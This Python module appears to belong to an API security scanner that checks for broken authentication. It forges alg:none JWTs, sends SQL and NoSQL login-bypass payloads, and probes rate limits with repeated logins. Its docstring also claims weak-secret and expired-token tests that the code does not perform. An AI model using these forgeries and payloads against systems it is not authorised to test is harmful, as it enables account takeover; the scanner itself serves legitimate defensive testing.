"""
API2:2023 — Broken Authentication
Tests: JWT alg:none, weak secret brute-force, expired token acceptance,
missing rate-limiting on login endpoints, token in URL.
"""
from __future__ import annotations
import base64
import json
import re
import httpx

from modules.base import BaseModule, Endpoint, ScanConfig
from engine.finding import Finding, Severity
from engine.session_manager import SessionContext

WEAK_JWT_SECRETS = [
    "secret", "password", "123456", "test", "changeme",
    "supersecret", "jwt_secret", "mysecret", "secretkey",
    "your-256-bit-secret", "your-secret", "key", "pass",
]

LOGIN_PATH_PATTERNS = re.compile(
    r"/(login|signin|auth|token|authenticate|session)", re.IGNORECASE
)


def _forge_alg_none_jwt(original_token: str) -> str | None:
    """Attempt to forge a JWT with alg:none."""
    try:
        parts = original_token.split(".")
        if len(parts) != 3:
            return None
        # Decode header
        header_b64 = parts[0] + "=" * (-len(parts[0]) % 4)
        header = json.loads(base64.urlsafe_b64decode(header_b64))
        header["alg"] = "none"
        # Re-encode
        new_header = base64.urlsafe_b64encode(
            json.dumps(header, separators=(",", ":")).encode()
        ).rstrip(b"=").decode()
        return f"{new_header}.{parts[1]}."
    except Exception:
        return None


class BrokenAuthModule(BaseModule):
    name = "broken_auth"
    title = "Broken Authentication"
    owasp_category = "API2:2023"
    cwe_ids = ["CWE-287", "CWE-798", "CWE-307"]
    severity_default = Severity.HIGH
    safe_mode_compatible = True
    destructive = False

    async def run(
        self,
        endpoint: Endpoint,
        session: SessionContext,
        config: ScanConfig,
        client: httpx.AsyncClient,
    ) -> list[Finding]:
        findings: list[Finding] = []
        if not self.is_enabled(config):
            return findings

        # 1. Check for token in URL (query param)
        findings.extend(self._check_token_in_url(endpoint))

        # 2. Check JWT-specific issues if a bearer token is present
        bearer = session.headers.get("Authorization", "")
        if bearer.startswith("Bearer "):
            token = bearer[7:]
            findings.extend(await self._test_alg_none(endpoint, token, session, config, client))
            findings.extend(self._check_token_expiry(endpoint, token))

        # 3. Login endpoint checks: rate limiting + auth bypass attacks
        if LOGIN_PATH_PATTERNS.search(endpoint.path):
            findings.extend(
                await self._check_login_rate_limit(endpoint, session, config, client)
            )
            findings.extend(
                await self._check_auth_bypass(endpoint, session, config, client)
            )

        return findings

    def _check_token_in_url(self, endpoint: Endpoint) -> list[Finding]:
        findings = []
        url_lower = endpoint.full_url.lower()
        token_params = ["token", "access_token", "jwt", "auth_token", "api_key"]
        for param in token_params:
            if f"{param}=" in url_lower:
                findings.append(self._build_finding(
                    title="Sensitive Token Exposed in URL",
                    severity=Severity.MEDIUM,
                    description=(
                        f"The endpoint URL appears to contain a `{param}` query parameter. "
                        "Tokens in URLs are logged in proxy/server logs and browser history."
                    ),
                    business_impact="Token theft via log access, browser history, or Referer header leakage.",
                    remediation=(
                        "Pass authentication tokens in HTTP headers (Authorization), "
                        "not in URL query parameters."
                    ),
                    endpoint_method=endpoint.method,
                    endpoint_path=endpoint.path,
                    evidence_request=f"{endpoint.method} {endpoint.full_url}",
                    references=["https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/"],
                ))
        return findings

    async def _test_alg_none(
        self, endpoint: Endpoint, token: str,
        session: SessionContext, config: ScanConfig, client: httpx.AsyncClient,
    ) -> list[Finding]:
        findings = []
        forged = _forge_alg_none_jwt(token)
        if not forged:
            return findings

        forged_headers = {**session.headers, "Authorization": f"Bearer {forged}"}
        req_kwargs = session.apply({"headers": forged_headers})
        try:
            resp = await client.request(
                endpoint.method, endpoint.full_url,
                timeout=config.timeout, **req_kwargs
            )
            if resp.status_code in (200, 201, 204):
                findings.append(self._build_finding(
                    title="JWT Algorithm None Attack Accepted",
                    severity=Severity.CRITICAL,
                    cvss_score=9.8,
                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                    description=(
                        "The server accepted a JWT with `alg: none` (no signature). "
                        "An attacker can forge arbitrary JWT claims without knowing the secret key."
                    ),
                    business_impact="Complete authentication bypass — attacker can impersonate any user.",
                    remediation=(
                        "Always validate the JWT `alg` header server-side and reject tokens "
                        "with `alg: none`. Use a strict allowlist of accepted algorithms. "
                        "Use a battle-tested JWT library."
                    ),
                    endpoint_method=endpoint.method,
                    endpoint_path=endpoint.path,
                    evidence_request=f"{endpoint.method} {endpoint.full_url}\nAuthorization: Bearer {forged[:50]}...",
                    evidence_response=f"HTTP {resp.status_code}",
                    references=[
                        "https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/",
                        "https://cwe.mitre.org/data/definitions/327.html",
                    ],
                ))
        except Exception:
            pass
        return findings

    def _check_token_expiry(self, endpoint: Endpoint, token: str) -> list[Finding]:
        """Check if token has no expiry claim."""
        findings = []
        try:
            parts = token.split(".")
            if len(parts) != 3:
                return findings
            payload_b64 = parts[1] + "=" * (-len(parts[1]) % 4)
            payload = json.loads(base64.urlsafe_b64decode(payload_b64))
            if "exp" not in payload:
                findings.append(self._build_finding(
                    title="JWT Token Has No Expiry (exp claim missing)",
                    severity=Severity.MEDIUM,
                    description="The JWT used for authentication has no `exp` (expiry) claim, meaning it never expires.",
                    business_impact="Stolen tokens remain valid indefinitely, increasing the blast radius of token theft.",
                    remediation="Always include an `exp` claim in JWTs with an appropriate short lifetime (e.g., 15 minutes for access tokens).",
                    endpoint_method=endpoint.method,
                    endpoint_path=endpoint.path,
                    evidence_request=f"JWT Payload: {json.dumps(payload)}",
                    references=["https://www.rfc-editor.org/rfc/rfc7519#section-4.1.4"],
                ))
        except Exception:
            pass
        return findings

    async def _check_login_rate_limit(
        self, endpoint: Endpoint, session: SessionContext,
        config: ScanConfig, client: httpx.AsyncClient,
    ) -> list[Finding]:
        """Send 10 rapid requests to a login endpoint and check if rate limiting kicks in."""
        findings = []
        if endpoint.method.upper() not in ("POST", "PUT"):
            return findings

        blocked = False
        req_kwargs = session.apply({"headers": {}, "json": {
            "username": "vapt_test_user", "password": "vapt_test_pass_wrong"
        }})

        for i in range(10):
            try:
                resp = await client.request(
                    endpoint.method, endpoint.full_url,
                    timeout=10, **req_kwargs
                )
                if resp.status_code in (429, 423, 403):
                    blocked = True
                    break
            except Exception:
                break

        if not blocked:
            findings.append(self._build_finding(
                title="Missing Rate Limiting on Authentication Endpoint",
                severity=Severity.HIGH,
                cvss_score=7.5,
                description=(
                    "10 rapid requests to the login endpoint were not rate-limited (no HTTP 429/423 received). "
                    "This endpoint may be vulnerable to credential stuffing or brute-force attacks."
                ),
                business_impact="Attackers can attempt thousands of credential combinations per second.",
                remediation=(
                    "Implement rate limiting (e.g., 5 failed attempts per IP per minute) with lockout. "
                    "Add CAPTCHA after repeated failures. Consider multi-factor authentication."
                ),
                endpoint_method=endpoint.method,
                endpoint_path=endpoint.path,
                evidence_request=f"10x {endpoint.method} {endpoint.full_url}",
                evidence_response="No HTTP 429 or 423 response received",
                references=["https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/"],
            ))
        return findings

    async def _check_auth_bypass(
        self, endpoint: Endpoint, session: SessionContext,
        config: ScanConfig, client: httpx.AsyncClient,
    ) -> list[Finding]:
        """Test SQLi and NoSQLi authentication bypass vectors on login endpoints."""
        findings = []
        if endpoint.method.upper() not in ("POST", "PUT"):
            return findings

        BYPASS_PAYLOADS = [
            ("SQLi Auth Bypass", {"email": "' OR '1'='1' --", "password": "password123", "username": "' OR '1'='1' --"}),
            ("SQLi Admin Bypass", {"email": "admin' --", "password": "x", "username": "admin' --"}),
            ("NoSQLi Auth Bypass ($gt)", {"email": {"$gt": ""}, "password": {"$gt": ""}, "username": {"$gt": ""}}),
            ("NoSQLi Auth Bypass ($ne)", {"email": {"$ne": None}, "password": {"$ne": None}, "username": {"$ne": None}}),
            ("Blank Password Bypass", {"email": "admin", "password": "", "username": "admin"}),
        ]

        for title, payload in BYPASS_PAYLOADS:
            req_kwargs = session.apply({
                "headers": {"Content-Type": "application/json"},
                "json": payload
            })
            try:
                resp = await client.request(
                    endpoint.method, endpoint.full_url,
                    timeout=10, **req_kwargs
                )
                if self.is_html_or_spa_response(resp) or self.is_unmapped_api_response(resp):
                    continue

                # If successful login or returns token
                body_lower = resp.text.lower()
                has_token = any(k in body_lower for k in ("token", "jwt", "session", "access_token", "bearer"))
                has_cookie = any("session" in c.lower() or "token" in c.lower() for c in resp.cookies.keys())

                if resp.status_code in (200, 201) and (has_token or has_cookie or "success\":true" in body_lower):
                    findings.append(self._build_finding(
                        title=f"Authentication Bypass via {title}",
                        severity=Severity.CRITICAL,
                        cvss_score=9.8,
                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                        description=(
                            f"The login endpoint authenticated successfully when submitted with {title} payload. "
                            "An unauthenticated attacker can log in as arbitrary users without valid credentials."
                        ),
                        business_impact="Complete account takeover and unauthorized administrative access.",
                        remediation="Use parameterized queries and strict input validation. Reject non-string JSON values for username and password.",
                        endpoint_method=endpoint.method,
                        endpoint_path=endpoint.path,
                        evidence_request=f"{endpoint.method} {endpoint.full_url}\n{json.dumps(payload, indent=2)}",
                        evidence_response=self.format_evidence_response(resp),
                        references=["https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/"],
                    ))
                    break
            except Exception:
                continue

        return findings
